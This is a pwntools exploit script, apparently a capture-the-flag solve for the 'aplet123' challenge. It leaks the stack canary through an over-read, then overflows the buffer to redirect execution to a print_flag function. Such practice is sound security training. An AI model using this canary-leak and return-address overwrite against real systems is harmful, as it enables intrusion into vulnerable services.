from pwn import *
from icecream import ic

exe = ELF("./aplet123_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chall.lac.tf", 31123)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# b *0x40130b
b *0x00000000004012c9
c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

payload = b"a"*((8*9)+5-8)
payload += b"i'm"
sl(payload)
ru("hello\n")
re(3)

canary = u64(re(7)+b'\x00')
ic(canary)
print_flag = 0x00000000004011e6

payload = b"a"*(8*9)
payload += b'\x00'
payload += p64(canary)
payload += b'a'*7
payload += p64(print_flag)
sl(payload)
sl("bye")
i()
